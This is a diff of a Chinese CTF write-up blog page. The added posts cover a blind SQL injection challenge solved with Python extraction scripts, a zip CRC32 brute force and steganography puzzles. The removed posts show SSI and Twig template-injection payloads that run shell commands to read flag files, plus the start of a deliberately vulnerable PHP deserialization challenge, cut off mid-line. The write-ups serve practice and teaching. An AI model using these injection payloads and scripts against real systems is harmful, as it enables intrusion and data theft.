@@ -71,6 +71,178 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-page-91" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/08/06/page-91/" class="article-date">
+  <time class="dt-published" datetime="2021-08-06T03:58:39.000Z" itemprop="datePublished">2021-08-06</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/08/06/page-91/">WUSTCTF2020颜值成绩查询</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>首先题目说了查询那正常是sql注入<br>在搜索框输入1 2 3 4 页面均有变化其他的都没有<br>各种’ “ 之类的符号都没有什么回显</p>
+<p>试一下布尔盲注</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(length(database())&gt;1,1,0) </span><br><span class="line">有回显</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/133.PNG?raw=true" alt="133.PNG"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(length(database())&gt;3,1,0) </span><br><span class="line">无回显</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/134.PNG?raw=true" alt="134.PNG"></p>
+<p>爆表：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">s=requests.session()</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(1,50):</span><br><span class="line">    for j in &#x27;&#123;qwertyuiopasdfghjklzxcvbnm_@#$%^&amp;*()_+=-0123456789,./?|&#125;&#x27;:</span><br><span class="line">        url=&quot;http://3690b471-adc4-4ce3-9854-38ef7b05bdef.node4.buuoj.cn/?stunum=if((select(substr(group_concat(table_name),&#123;&#125;,1))from/**/information_schema.tables/**/where/**/table_schema=database())=&#x27;&#123;&#125;&#x27;,1,2)&quot;.format(i,j) </span><br><span class="line">        c = s.get(url ,timeout=3)</span><br><span class="line">        #print c.text</span><br><span class="line">        if &#x27;Hi admin&#x27; in c.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+
+<p>爆字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">s=requests.session()</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(1,50):</span><br><span class="line">    for j in &#x27;&#123;qwertyuiopasdfghjklzxcvbnm_@#$%^&amp;*()_=-0123456789,./?|&#125;&#x27;:</span><br><span class="line">        url=&quot;http://3690b471-adc4-4ce3-9854-38ef7b05bdef.node4.buuoj.cn/?stunum=if((select(substr(group_concat(column_name),&#123;&#125;,1))from/**/information_schema.columns/**/where/**/table_schema=database())=&#x27;&#123;&#125;&#x27;,1,2)&quot;.format(i,j) </span><br><span class="line">        c = s.get(url ,timeout=3)</span><br><span class="line">        #print c.text</span><br><span class="line">        if &#x27;Hi admin&#x27; in c.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+
+<p>爆值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">s=requests.session()</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(1,50):</span><br><span class="line">    for j in &#x27;&#123;qwertyuiopasdfghjklzxcvbnm_@#$%^&amp;*()_=-0123456789,./?|&#125;&#x27;:</span><br><span class="line">        url=&quot;http://3690b471-adc4-4ce3-9854-38ef7b05bdef.node4.buuoj.cn/?stunum=if((select(substr(group_concat(value),&#123;&#125;,1))from/**/flag)=&#x27;&#123;&#125;&#x27;,1,2)&quot;.format(i,j) </span><br><span class="line">        c = s.get(url ,timeout=3)</span><br><span class="line">        #print c.text</span><br><span class="line">        if &#x27;Hi admin&#x27; in c.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/08/06/page-91/" data-id="ckuz7ucrz002i3sw75jobaimi" data-title="WUSTCTF2020颜值成绩查询" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-90" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/07/29/page-90/" class="article-date">
+  <time class="dt-published" datetime="2021-07-29T10:39:12.000Z" itemprop="datePublished">2021-07-29</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/07/29/page-90/">buuctf  misc zip</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>解压缩发现每个包都很小 </p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/124.PNG?raw=true" alt="124.PNG"></p>
+<p>其中对应的ascii码的值可以穷举，就把他全部穷举然后算一下crc32码 </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python3</span></span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackCrc</span>(<span class="params">crc</span>):</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">			<span class="keyword">for</span> k <span class="keyword">in</span> dic:</span><br><span class="line">				<span class="keyword">for</span> h <span class="keyword">in</span> dic:</span><br><span class="line">					s = i + j + k + h</span><br><span class="line">					<span class="keyword">if</span> crc == (binascii.crc32(s.encode())):</span><br><span class="line">						f.write(s)</span><br><span class="line">						<span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackZip</span>():</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">68</span>):</span><br><span class="line">		file = <span class="string">&#x27;out&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;.zip&#x27;</span></span><br><span class="line">		crc = zipfile.ZipFile(file,<span class="string">&#x27;r&#x27;</span>).getinfo(<span class="string">&#x27;data.txt&#x27;</span>).CRC</span><br><span class="line">		CrackCrc(crc)</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>+<span class="string">&quot;loading：&#123;:%&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">float</span>((i+<span class="number">1</span>)/<span class="number">68</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dic = string.ascii_letters + string.digits + <span class="string">&#x27;+/=&#x27;</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nCRC32begin&quot;</span>)</span><br><span class="line">CrackZip()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;CRC32finished&quot;</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
+
+<p>脚本给全部爆破出来然后把每个压缩包的内容存入1.txt  <strong>内容是base64码</strong><br>解码一下发现以rar文件为结尾</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/125.PNG?raw=true" alt="125.PNG"></p>
+<p>将这解码内容写入一个新的文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">base64_text = <span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">byte_stream = base64.b64decode(base64_text)</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;xin.txt&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(byte_stream)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">010 添加一个rar的文件头52 61 72 21 1A 07 00</span><br></pre></td></tr></table></figure>
+
+<p>打开在注释那边找到flag</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/126.PNG?raw=true" alt="126.PNG"></p>
+<p><strong>RoarCTF2019黄金6年</strong><br>这五年你知道我是怎么过的吗？(；′⌒`) 最后就剩活着了<br>首先是视频丢010末尾有一段base64复制下来解码提示是rar文件</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/131.PNG?raw=true" alt="131.PNG"></p>
+<p>用上面的代码导出然后解压缩 欸不好意思有密码<br>那就只能从视频里面找内容了 （讨厌这种视频题，找得眼睛快瞎了）<br>四张二维码 key1:i key2:want key3:play key4:ctf</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/127.PNG?raw=true" alt="127.PNG"></p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/128.PNG?raw=true" alt="128.PNG"></p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/129.PNG?raw=true" alt="129.PNG"></p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/130.PNG?raw=true" alt="130.PNG"></p>
+<p>解压缩包即可</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/07/29/page-90/" data-id="ckuz7ucrx002g3sw7aqkm03zh" data-title="buuctf  misc zip" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-89" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/07/29/page-89/" class="article-date">
+  <time class="dt-published" datetime="2021-07-29T10:28:56.000Z" itemprop="datePublished">2021-07-29</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/07/29/page-89/">misc2</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p> <strong>SWPU2019你有没有好好看网课?</strong><br>文件里面的doc里面有提示 520 和 711 还提示了放大镜<br>神啊这关真的折磨人找了半天 在5秒20左右和7秒11左右找到如下<br>dXBfdXBfdXA=<br>….. ../… ./ … ./ … ../<br>有个叫做敲击码的东西用两个数字代表一个字母</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/79.PNG?raw=true" alt="79.PNG"></p>
+<p>解码得到如下wllmup_up_up 解包拿到图片010打开有一段空数据那边就有flag</p>
+<p><strong>MRCTF2020ezmisc</strong> crc校验问题 然后就是硬改就好了</p>
+<p>弱口令 压缩包那边有一段注释 复制下来又是一堆的由空格和tab组合的<br>空格作 . tab作-<br> …. . .-.. .-.. —– ..-. — .-. ..- –  摩斯电码<br>HELL0FORUM 解码得<br><a target="_blank" rel="noopener" href="https://github.com/livz/cloacked-pixel">https://github.com/livz/cloacked-pixel</a></p>
+<p>下载一个lsb隐写工具<br>然后根据题目弱口令猜测密码应该是123456<br>.\lsb.py extract .\123.png flag.txt 123456<br>生成flag.txt </p>
+<p><strong>HBNIS2018低个头</strong> 很有意思真的低下头看一下键盘然后<br>EWAZX RTY TGB IJN IO KL<br>CTF 然后还真是flag</p>
+<p><strong>john-in-the-middle</strong><br>是个抓包文件然后发现很多http的然后到处对象为http得到几张图片</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/80.PNG?raw=true" alt="80.PNG"></p>
+<p>scanlines.png 发现很多通道都有一条白条</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/81.PNG?raw=true" alt="81.PNG"></p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/82.PNG?raw=true" alt="82.PNG"></p>
+<p>logo.png 这中间空了 stegsolve那边的image combiner将两个合在一起 拿到flag</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/83.PNG?raw=true" alt="83.PNG"></p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/84.PNG?raw=true" alt="84.PNG"></p>
+<p><strong>BSidesCF 2019Futurella</strong> 这是web然而这关跟杂项似的 把页面的东西复制一下然后就就就有flag了 (・∀・(・∀・(・∀・*) </p>
+<p><strong>SUCTF2018single dog</strong><br>文件分离拿到一个文档都是颜文字的这叫做aaencode将js代码转换成颜文字要解码只要把东西丢到控制台<br>就可以提示双十一快乐 翻译一下 翻译翻译什么tm的叫tm的双十一快乐<br>happydoubleeleven</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/123.PNG?raw=true" alt="123.PNG"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/07/29/page-89/" data-id="ckuz7ucrx002f3sw70jog5wbl" data-title="misc2" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-page-88" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/07/29/page-88/" class="article-date">
@@ -497,172 +669,11 @@
 
 
   
-    <article id="post-page-81" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/07/29/page-81/" class="article-date">
-  <time class="dt-published" datetime="2021-07-29T06:23:27.000Z" itemprop="datePublished">2021-07-29</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/07/29/page-81/">BJDCTF2020EasySearch</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>老样子还是得扫后台扫到一个index.php.swp 进入后给了源码 重点是这部分</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_POST[&#x27;username&#x27;]) and $_POST[&#x27;username&#x27;] != &#x27;&#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">        $admin = &#x27;6d0bc1&#x27;;</span><br><span class="line">        if ( $admin == substr(md5($_POST[&#x27;password&#x27;]),0,6)) &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">            $file_shtml = &quot;public/&quot;.get_hash().&quot;.shtml&quot;;</span><br><span class="line">            $shtml = fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);</span><br><span class="line">            $text = &#x27;</span><br><span class="line">            ***</span><br><span class="line">            ***</span><br><span class="line">            &lt;h1&gt;Hello,&#x27;.$_POST[&#x27;username&#x27;].&#x27;&lt;/h1&gt;</span><br><span class="line">            ***</span><br><span class="line">			***&#x27;;</span><br><span class="line">            fwrite($shtml,$text);</span><br><span class="line">            fclose($shtml);</span><br></pre></td></tr></table></figure>
-
-<p><strong>只要有一个密码前六位的MD5是6d0bc1 跑脚本：</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">a= <span class="string">&quot;0123456789&quot;</span></span><br><span class="line"><span class="keyword">for</span> o <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> a:</span><br><span class="line">        <span class="keyword">for</span> q <span class="keyword">in</span> a:</span><br><span class="line">            <span class="keyword">for</span> r <span class="keyword">in</span> a:</span><br><span class="line">                <span class="keyword">for</span> s <span class="keyword">in</span> a:</span><br><span class="line">                    <span class="keyword">for</span> t <span class="keyword">in</span> a:</span><br><span class="line">                        <span class="keyword">for</span> u <span class="keyword">in</span> a:</span><br><span class="line">                            b = <span class="built_in">str</span>(o)+<span class="built_in">str</span>(p)+<span class="built_in">str</span>(q)+<span class="built_in">str</span>(r)+<span class="built_in">str</span>(s)+<span class="built_in">str</span>(t)+<span class="built_in">str</span>(u)</span><br><span class="line">                            md5 = hashlib.md5(b.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">                            <span class="keyword">if</span> ((md5[<span class="number">0</span>:<span class="number">6</span>])==<span class="string">&#x27;6d0bc1&#x27;</span>):</span><br><span class="line">                                <span class="built_in">print</span> b</span><br></pre></td></tr></table></figure>
-
-<p><strong>2020666</strong><br><strong>2305004</strong><br><strong>9162671</strong>  这仨结果随便选一个 <strong>username=2020666&amp;password=2020666</strong><br>然后抓包发现这边好像会写入一个.shtml 的文件可以访问</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/68.PNG?raw=true" alt="68.PNG"></p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/69.PNG?raw=true" alt="69.PNG"></p>
-<p>百度了一下这边可以<strong>进行ssi注入</strong> </p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/70.PNG?raw=true" alt="70.PNG"></p>
-<p>参考链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/bonelee/p/12027775.html">https://www.cnblogs.com/bonelee/p/12027775.html</a><br>可以进行远程命令执行  </p>
-<p>传个ls试试 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&lt;!--#exec cmd=&quot;ls&quot; --&gt;&amp;password=2020666</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/67.PNG?raw=true" alt="67.PNG"></p>
-<p>可以访问到but该文件 flag不在这     </p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/72.PNG?raw=true" alt="72.PNG"></p>
-<p>返回上一个目录 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&lt;!--#exec cmd=&quot;ls ../&quot; --&gt;&amp;password=2020666  </span><br></pre></td></tr></table></figure>
-
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/74.PNG?raw=true" alt="74.PNG"></p>
-<p>看样子可以找到flag<br>传入：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot; --&gt;&amp;password=2020666</span><br></pre></td></tr></table></figure>
-
-<p> 访问生成的文件 ok</p>
-<p> <img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/73.PNG?raw=true" alt="73.PNG"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/07/29/page-81/" data-id="ckuz7ucru00273sw72q3u7zts" data-title="BJDCTF2020EasySearch" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-page-80" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/07/29/page-80/" class="article-date">
-  <time class="dt-published" datetime="2021-07-29T06:20:09.000Z" itemprop="datePublished">2021-07-29</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/07/29/page-80/">CISCN2019 华东南赛区Web11</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>和[BJDCTF2020]The mystery of ip   这个很类似<br>抓包 通过X-Forwarded-For 来找点</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For= &#123;&#123;7*&#x27;7&#x27;&#125;&#125;  回显49==&gt; Twig </span><br><span class="line">直接就X-Forwarded-For: &#123;&#123;system(&quot;cat /flag&quot;)&#125;&#125;就可以</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/66.PNG?raw=true" alt="66.PNG"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/07/29/page-80/" data-id="ckuz7ucrt00253sw77o9yh5ym" data-title="CISCN2019 华东南赛区Web11" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-page-79" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/07/21/page-79/" class="article-date">
-  <time class="dt-published" datetime="2021-07-21T13:29:35.000Z" itemprop="datePublished">2021-07-21</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/07/21/page-79/">MRCTF2020Ezpop</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>Welcome to index.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span 